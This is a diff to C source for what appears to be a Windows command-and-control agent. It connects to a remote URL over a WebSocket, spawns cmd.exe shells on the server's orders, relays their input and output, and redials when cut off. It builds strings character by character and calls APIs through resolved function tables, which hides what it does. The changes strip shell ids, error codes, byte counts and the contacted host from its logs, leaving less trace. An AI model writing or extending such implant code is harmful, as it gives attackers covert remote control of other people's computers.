@@ -49,7 +49,7 @@ static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
     write_u32_le(reply, &pos, corr_id);
     write_u64_le(reply, &pos, (unsigned long long)id);
     *reply_len = 16;
-    LOG_INFO("Shell %d opened (cmd.exe spawned) - id prepared\n", id);
+    LOG_INFO("Shell opened successfully (cmd.exe spawned)\n");
     return STATUS_OK;
 }
 
@@ -75,7 +75,7 @@ static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *ms
     write_u32_le(reply, &pos, (DWORD)status);
     write_u32_le(reply, &pos, corr_id);
     *reply_len = 8;
-    LOG_INFO("Write to shell %llu - status %d\n", id, status);
+    LOG_INFO("Write to shell succeeded\n");
     return (DWORD)status;
 }
 
@@ -95,7 +95,7 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
         write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
-        LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
+        LOG_ERROR("Read shell - unknown id, status 1\n");
         return STATUS_ERROR;
     }
 
@@ -110,7 +110,7 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
         write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
-        LOG_ERROR("Shell %llu exited - status 1, slot freed\n", id);
+        LOG_ERROR("Shell exited - status 1, slot freed\n");
         return STATUS_ERROR;
     }
 
@@ -121,9 +121,9 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
     MemoryCopy(reply, chunk, 8 + got + 1);
     *reply_len = 8 + got + 1;
     if (r == SHELL_READ_IDLE)
-        LOG_INFO("Read shell %llu - idle\n", id);
+        LOG_INFO("Read shell - idle\n");
     else
-        LOG_INFO("Read shell %llu - %lu byte(s)\n", id, got);
+        LOG_INFO("Read shell - data received\n");
     return STATUS_OK;
 }
 
@@ -138,9 +138,9 @@ static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *ms
     shell_slot *slot = shell_lookup(ctx->shells, id);
     if (slot) {
         shell_teardown(slot);
-        LOG_INFO("Shell %llu closed (cmd.exe terminated)\n", id);
+        LOG_INFO("Shell closed (cmd.exe terminated)\n");
     } else {
-        LOG_INFO("Close shell %llu - not open (still ok)\n", id);
+        LOG_INFO("Close shell - not open (still ok)\n");
     }
 
     int pos = 0;
@@ -186,7 +186,7 @@ INT32 agent_main(const WCHAR *url)
             else if (backoff_pos + 1 < backoff_count)
                 backoff_pos++;
 
-            LOG_INFO("[i] connection lost - redialing in %d s ...\n", wait_s);
+            LOG_INFO("[i] connection lost - redialing ...\n");
             kernel.Sleep((DWORD)wait_s * 1000);
         }
     }
@@ -223,7 +223,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
 
     if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
-        LOG_ERROR("WinHttpCrackUrl (invalid URL?) failed: %lu\n", kernel32.GetLastError());
+        LOG_ERROR("WinHttpCrackUrl failed (invalid URL)\n");
         rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
@@ -247,26 +247,25 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     } else {
         scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p'; scheme[4]=0;
     }
-    LOG_INFO("Connecting to %ls://%ls%ls ... ",
-           scheme, uc.lpszHostName, uc.lpszUrlPath);
+    LOG_INFO("Connecting to remote URL...\n");
 
     WCHAR ua_buf[18];
     StrUserAgent(ua_buf);
     session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
+    if (!session) { LOG_ERROR("WinHttpOpen failed\n"); goto cleanup; }
 
     connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
-    if (!connection) { LOG_ERROR("WinHttpConnect failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
+    if (!connection) { LOG_ERROR("WinHttpConnect failed\n"); goto cleanup; }
 
     DWORD request_flags = WINHTTP_FLAG_REFRESH;
     if (https) request_flags |= WINHTTP_FLAG_SECURE;
     WCHAR get_buf[4];
     StrGetMethodW(get_buf);
     request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
-    if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
+    if (!request) { LOG_ERROR("WinHttpOpenRequest failed\n"); goto cleanup; }
 
     if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
-        LOG_ERROR("winhttp.WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
+        LOG_ERROR("WinHttpSetOption UPGRADE_TO_WEB_SOCKET failed\n");
         goto cleanup;
     }
 
@@ -283,20 +282,19 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
-    LOG_INFO("Identity: %lu header bytes on the upgrade request\n",
-           (unsigned long)headers_len);
+    LOG_INFO("Identity headers prepared\n");
 
     if (!winhttp.WinHttpSendRequest(request, headers_w,(DWORD)headers_len, NULL, 0, 0, 0)) {
-        LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
+        LOG_ERROR("WinHttpSendRequest failed\n"); goto cleanup;
     }
 
     if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
-        LOG_ERROR("WinHttpReceiveResponse failed: %lu\n", kernel32.GetLastError()); goto cleanup;
+        LOG_ERROR("WinHttpReceiveResponse failed\n"); goto cleanup;
     }
 
     socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
     if (!socket) {
-        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed: %lu\n", kernel32.GetLastError());
+        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed\n");
         goto cleanup;
     }
     winhttp.WinHttpCloseHandle(request);
@@ -306,24 +304,19 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
 
     incoming_message msg;
-    for (int index = 1; ; index++) {
+    for (;;) {
         *long_lived = 1;
         BOOL closed = FALSE;
 
         DWORD err = ws_receive(&winhttp, socket, &msg, &closed);
         if (err != NO_ERROR) {
-            LOG_ERROR("WinHttpWebSocketReceive failed: %lu\n", err);
+            LOG_ERROR("WinHttpWebSocketReceive failed\n");
             goto cleanup;
         }
         if (closed) {
             LOG_ERROR("Server closed the connection - redialing.\n");
             goto cleanup;
         }
-
-#ifdef LOGGING_ENABLED
-        if (ctx->verbose)
-            print_command(index, &msg);
-#endif
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
 
@@ -336,11 +329,10 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
-                LOG_ERROR("Message over %d bytes - refused, status 1\n",
-                       MAX_MESSAGE_SIZE);
+                LOG_ERROR("Message over max size - refused, status 1\n");
                 continue;
             }
-            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
+            LOG_ERROR("Failed to send WebSocket response\n");
             goto cleanup;
         }
 
@@ -375,12 +367,11 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
-                LOG_INFO("Command 0x%02x not implemented - replied status 1\n",
-                       opcode);
+                LOG_INFO("Command not implemented - replied status 1\n");
             }
         }
         if (err != NO_ERROR) {
-            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
+            LOG_ERROR("Failed to send WebSocket response\n");
             goto cleanup;
         }
 
